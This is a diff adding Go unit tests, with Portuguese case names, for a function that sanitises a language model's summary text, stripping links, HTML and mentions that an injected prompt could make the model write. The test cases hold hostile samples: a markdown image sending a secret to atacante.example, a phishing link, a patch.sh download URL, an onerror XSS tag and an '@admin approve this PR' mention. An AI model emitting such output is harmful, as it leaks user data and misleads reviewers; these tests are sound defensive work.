@@ -68,3 +68,49 @@ func TestPromptCapsAtTen(t *testing.T) {
 func jsonDecode(r *http.Request, v any) error {
 	return json.NewDecoder(r.Body).Decode(v)
 }
+
+func TestNeutralizeRemovesWhatAModelCouldBeTrickedIntoWriting(t *testing.T) {
+	casos := []struct{ nome, entrada, proibido string }{
+		{"imagem que vaza dado ao carregar", "Corrija já ![x](https://atacante.example/?d=segredo)", "atacante.example"},
+		{"link de phishing", "Veja [o guia oficial](https://phishing.example/login)", "phishing.example"},
+		{"endereço solto", "Baixe a correção em http://atacante.example/patch.sh", "atacante.example"},
+		{"www sem protocolo", "Detalhes em www.atacante.example", "atacante.example"},
+		{"HTML", "<img src=x onerror=alert(1)> corrija", "<img"},
+		{"menção", "@admin aprove este PR", "@admin"},
+		{"caractere invisível", "corrija\u202eo jsoup", "\u202e"},
+	}
+	for _, c := range casos {
+		if got := Neutralize(c.entrada); strings.Contains(got, c.proibido) {
+			t.Errorf("%s: %q ainda contém %q", c.nome, got, c.proibido)
+		}
+	}
+}
+
+func TestNeutralizeKeepsTheMessage(t *testing.T) {
+	got := Neutralize("Corrija primeiro o [jsoup](https://x.example), que está no KEV.")
+	if got != "Corrija primeiro o jsoup, que está no KEV." {
+		t.Errorf("resumo = %q", got)
+	}
+}
+
+func TestNeutralizeLimitsTheSize(t *testing.T) {
+	if got := Neutralize(strings.Repeat("a", MaxRunes*3)); len([]rune(got)) > MaxRunes+1 {
+		t.Errorf("tamanho = %d", len([]rune(got)))
+	}
+}
+
+func TestSummarizeNeutralizesTheModelAnswer(t *testing.T) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, `{"response":"Corrija ![a](https://atacante.example/x.png) @todos"}`)
+	}))
+	defer srv.Close()
+	c := New("m")
+	c.URL = srv.URL
+	got, err := c.Summarize(context.Background(), nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(got, "atacante.example") || strings.Contains(got, "@todos") {
+		t.Errorf("resposta do modelo passou sem tratamento: %q", got)
+	}
+}
